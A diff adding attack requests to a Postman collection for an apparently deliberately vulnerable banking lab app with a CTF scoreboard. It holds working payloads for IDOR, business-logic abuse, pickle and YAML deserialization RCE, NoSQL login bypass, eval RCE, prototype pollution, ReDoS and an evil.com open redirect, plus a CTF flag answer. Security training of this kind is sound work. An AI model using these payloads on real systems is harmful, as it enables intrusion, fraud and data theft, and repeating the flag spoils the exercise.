@@ -761,5 +761,372 @@
         }
       ]
     }
+    ,
+    {
+      "name": "IDOR",
+      "item": [
+        {
+          "name": "IDOR - Read Any Account",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "X-User-Id", "value": "3"}],
+            "url": {"raw": "{{base_url}}/api/accounts/1", "host": ["{{base_url}}"], "path": ["api", "accounts", "1"]},
+            "description": "CWE-639: IDOR — Bob (user 3) reads admin account (id=1) with no ownership check. Observe: admin balance $50,000 and notification email returned."
+          }
+        },
+        {
+          "name": "IDOR - Read Any Account Transactions",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "X-User-Id", "value": "3"}],
+            "url": {"raw": "{{base_url}}/api/accounts/1/transactions", "host": ["{{base_url}}"], "path": ["api", "accounts", "1", "transactions"]},
+            "description": "CWE-639: IDOR — returns admin's full transaction history with no auth check. X-User-Id spoofed to 3 (Bob)."
+          }
+        },
+        {
+          "name": "IDOR - Read Any User Profile (PII + SSN)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "X-User-Id", "value": "3"}],
+            "url": {"raw": "{{base_url}}/api/users/1/profile", "host": ["{{base_url}}"], "path": ["api", "users", "1", "profile"]},
+            "description": "CWE-639 + CWE-359: IDOR — returns admin's PII including SSN '123-45-6789', phone, and address. No ownership check."
+          }
+        },
+        {
+          "name": "IDOR - Update Any Account Settings",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {"key": "X-User-Id", "value": "3"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "url": {"raw": "{{base_url}}/api/accounts/1/settings", "host": ["{{base_url}}"], "path": ["api", "accounts", "1", "settings"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"notification_email\": \"attacker@evil.com\", \"daily_limit\": 999999}"
+            },
+            "description": "CWE-639: IDOR — Bob redirects admin account's notification emails to attacker address. Attacker intercepts all transaction alerts."
+          }
+        },
+        {
+          "name": "IDOR - Download Any Statement",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "X-User-Id", "value": "3"}],
+            "url": {"raw": "{{base_url}}/api/statements/1", "host": ["{{base_url}}"], "path": ["api", "statements", "1"]},
+            "description": "CWE-639: IDOR — returns admin's January statement PDF path with no ownership check. Enumerate statement_id to find all statements."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Business Logic",
+      "item": [
+        {
+          "name": "Business Logic - Overdraft (No Balance Check)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/transfer/overdraft", "host": ["{{base_url}}"], "path": ["api", "transfer", "overdraft"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"from_account\": 3, \"to_account\": 2, \"amount\": 999999}"
+            },
+            "description": "CWE-840: No balance check — transfer $999,999 from Bob's account (balance $800). Balance goes to -$999,199. Observe: new_balance is deeply negative."
+          }
+        },
+        {
+          "name": "Business Logic - Unlimited Loan",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/loans/apply", "host": ["{{base_url}}"], "path": ["api", "loans", "apply"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": 2, \"amount\": 1000000000, \"term_months\": 360, \"annual_rate\": 0.01}"
+            },
+            "description": "CWE-20: No loan amount validation — apply for $1,000,000,000 loan. Server approves without any upper-bound check."
+          }
+        },
+        {
+          "name": "Business Logic - Negative Fee (Bank Pays You)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/fees/waive", "host": ["{{base_url}}"], "path": ["api", "fees", "waive"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": 2, \"fee_amount\": -500, \"reason\": \"compensation\"}"
+            },
+            "description": "CWE-285 + CWE-840: Any user can waive fees; negative amount credits the account. $500 added to Alice's balance."
+          }
+        },
+        {
+          "name": "Business Logic - Attacker-Supplied Exchange Rate",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/transfer/currency", "host": ["{{base_url}}"], "path": ["api", "transfer", "currency"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"from_account\": 3, \"to_account\": 2, \"amount\": 1, \"rate\": 10000, \"currency\": \"USD\"}"
+            },
+            "description": "CWE-840: Exchange rate taken from request body. Transfer $1 at 10,000x rate — $10,000 credited to destination."
+          }
+        },
+        {
+          "name": "Business Logic - Negative Interest Rate",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/interest/calculate?principal=1000&rate=-0.5&years=1",
+              "host": ["{{base_url}}"],
+              "path": ["api", "interest", "calculate"],
+              "query": [
+                {"key": "principal", "value": "1000"},
+                {"key": "rate", "value": "-0.5"},
+                {"key": "years", "value": "1"}
+              ]
+            },
+            "description": "CWE-20: Negative interest rate — bank pays customer $500 interest on $1000 principal. No sign validation on rate parameter."
+          }
+        },
+        {
+          "name": "Business Logic - Voucher Race Condition",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/voucher/redeem", "host": ["{{base_url}}"], "path": ["api", "voucher", "redeem"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": 2, \"voucher_code\": \"BONUS50\"}"
+            },
+            "description": "CWE-362: Race condition — send two concurrent requests to redeem BONUS50. Both pass the 'already used' check before either sets used=True. Run with: for i in 1 2; do curl -X POST ... &; done"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Deserialization",
+      "item": [
+        {
+          "name": "Deserialization - Pickle RCE via Header",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "X-Session-Data", "value": "gASVLAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+IC90bXAvcHduZWSUhZRSlC4="}
+            ],
+            "url": {"raw": "{{base_url}}/api/session/restore", "host": ["{{base_url}}"], "path": ["api", "session", "restore"]},
+            "description": "CWE-502: Pickle deserialization RCE. X-Session-Data header contains base64-encoded pickle payload. Server calls pickle.loads() → os.system('id > /tmp/pwned'). Replace with your own payload."
+          }
+        },
+        {
+          "name": "Deserialization - YAML Unsafe Load",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/x-yaml"}],
+            "url": {"raw": "{{base_url}}/api/preferences/import", "host": ["{{base_url}}"], "path": ["api", "preferences", "import"]},
+            "body": {
+              "mode": "raw",
+              "raw": "!!python/object/apply:os.system [\"id > /tmp/yaml_pwned\"]"
+            },
+            "description": "CWE-502: yaml.load() without SafeLoader executes arbitrary Python. Payload calls os.system via !!python/object/apply tag. Observe: command executed server-side."
+          }
+        },
+        {
+          "name": "Deserialization - Report Template RCE",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/report/generate", "host": ["{{base_url}}"], "path": ["api", "report", "generate"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"template\": \"gASVLAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+IC90bXAvcHduZWSUhZRSlC4=\", \"format\": \"pdf\"}"
+            },
+            "description": "CWE-502: Report template is base64 pickle. Server deserializes it calling pickle.loads() → RCE. Generate your own payload with the Python snippet in the writeup."
+          }
+        },
+        {
+          "name": "Deserialization - GET Token Unpickle (No Auth)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/session/load?token=gASVLAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+IC90bXAvcHduZWSUhZRSlC4=",
+              "host": ["{{base_url}}"],
+              "path": ["api", "session", "load"],
+              "query": [{"key": "token", "value": "gASVLAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+IC90bXAvcHduZWSUhZRSlC4="}]
+            },
+            "description": "CWE-502: Unauthenticated GET endpoint — token query param base64-decoded and unpickled. RCE without any session or auth. Observe: command executed server-side."
+          }
+        }
+      ]
+    },
+    {
+      "name": "NoSQL Injection",
+      "item": [
+        {
+          "name": "NoSQL - Login Bypass ($ne operator)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/nosql/login", "host": ["{{base_url}}"], "path": ["api", "nosql", "login"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}"
+            },
+            "description": "CWE-943: NoSQL injection — entire JSON body passed to MongoDB find_one(). $ne operator matches any non-empty password. Observe: authenticated as admin without knowing password."
+          }
+        },
+        {
+          "name": "NoSQL - Dump All Accounts ($gt filter)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/nosql/accounts?filter={\"balance\":{\"$gt\":0}}",
+              "host": ["{{base_url}}"],
+              "path": ["api", "nosql", "accounts"],
+              "query": [{"key": "filter", "value": "{\"balance\":{\"$gt\":0}}"}]
+            },
+            "description": "CWE-943: filter param parsed as JSON and used directly as MongoDB query. $gt:0 returns all accounts. Try filter={} for all documents."
+          }
+        },
+        {
+          "name": "NoSQL - Server-Side JS via $where",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/nosql/search", "host": ["{{base_url}}"], "path": ["api", "nosql", "search"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"$where\": \"this.balance > 0\"}"
+            },
+            "description": "CWE-943: $where operator executes server-side JavaScript in MongoDB. Observe: all users with positive balance returned. For time-based blind: {\"$where\": \"function() { sleep(5000); return true; }\"}"
+          }
+        },
+        {
+          "name": "NoSQL - Role Escalation via $set Injection",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-User", "value": "alice"}
+            ],
+            "url": {"raw": "{{base_url}}/api/nosql/profile", "host": ["{{base_url}}"], "path": ["api", "nosql", "profile"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"email\": \"alice@evil.com\", \"role\": \"admin\", \"balance\": 999999}"
+            },
+            "description": "CWE-943: Request body merged into $set operator without field whitelist. Alice escalates her own role to admin and sets balance to $999,999."
+          }
+        }
+      ]
+    },
+    {
+      "name": "CTF",
+      "item": [
+        {
+          "name": "CTF - List Flags and Categories",
+          "request": {
+            "method": "GET",
+            "url": {"raw": "{{base_url}}/api/ctf/flags", "host": ["{{base_url}}"], "path": ["api", "ctf", "flags"]},
+            "description": "Returns all CTF flag categories and point values. Use this to see what flags are available to capture."
+          }
+        },
+        {
+          "name": "CTF - Submit Flag",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/ctf/submit", "host": ["{{base_url}}"], "path": ["api", "ctf", "submit"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"team\": \"YourTeamName\", \"flag\": \"FLAG{sql_1nj3ct10n_m4st3r}\"}"
+            },
+            "description": "Submit a captured flag for scoring. Replace team name and flag value. Correct submission awards 100 points. Duplicate submissions are rejected."
+          }
+        },
+        {
+          "name": "CTF - Scoreboard",
+          "request": {
+            "method": "GET",
+            "url": {"raw": "{{base_url}}/api/ctf/scoreboard", "host": ["{{base_url}}"], "path": ["api", "ctf", "scoreboard"]},
+            "description": "Returns all team scores sorted by score descending, then first solve time ascending. Use to track competition progress."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Node.js Vulns",
+      "item": [
+        {
+          "name": "Node - Prototype Pollution (lodash merge)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "http://localhost:3000/api/merge", "host": ["localhost:3000"], "path": ["api", "merge"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"__proto__\": {\"admin\": true, \"role\": \"admin\"}}"
+            },
+            "description": "CWE-1321: Prototype Pollution via _.merge(). __proto__ key pollutes Object.prototype. After this request ({}).admin === true for ALL objects in the Node.js process."
+          }
+        },
+        {
+          "name": "Node - eval() RCE",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "http://localhost:3000/api/eval", "host": ["localhost:3000"], "path": ["api", "eval"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"code\": \"require('child_process').execSync('id').toString()\"}"
+            },
+            "description": "CWE-94: Direct eval() of attacker-controlled code. Arbitrary Node.js RCE. Observe: output of 'id' command in response."
+          }
+        },
+        {
+          "name": "Node - ReDoS (catastrophic backtracking)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "http://localhost:3000/api/regex?pattern=(a%2B)%2B&input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
+              "host": ["localhost:3000"],
+              "path": ["api", "regex"],
+              "query": [
+                {"key": "pattern", "value": "(a+)+"},
+                {"key": "input", "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
+              ]
+            },
+            "description": "CWE-400: ReDoS via user-controlled RegExp. Pattern (a+)+ with non-matching trailing '!' causes catastrophic backtracking — hangs the Node.js event loop."
+          }
+        },
+        {
+          "name": "Node - Open Redirect",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "http://localhost:3000/api/redirect?url=https://evil.com",
+              "host": ["localhost:3000"],
+              "path": ["api", "redirect"],
+              "query": [{"key": "url", "value": "https://evil.com"}]
+            },
+            "description": "CWE-601: Open redirect — url param not validated. Server responds with 302 to attacker-controlled URL. Use for phishing: send victim a legitimate-looking link that redirects to evil.com."
+          }
+        },
+        {
+          "name": "Node - SSTI via String Concatenation",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "http://localhost:3000/api/template", "host": ["localhost:3000"], "path": ["api", "template"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"name\": \"<img src=x onerror=alert(1)>\"}"
+            },
+            "description": "CWE-94: User input concatenated into HTML template without escaping. In real template engines (Pug/EJS) this enables SSTI → RCE. Here demonstrates XSS via unsanitized HTML output."
+          }
+        }
+      ]
+    }
   ]
 }
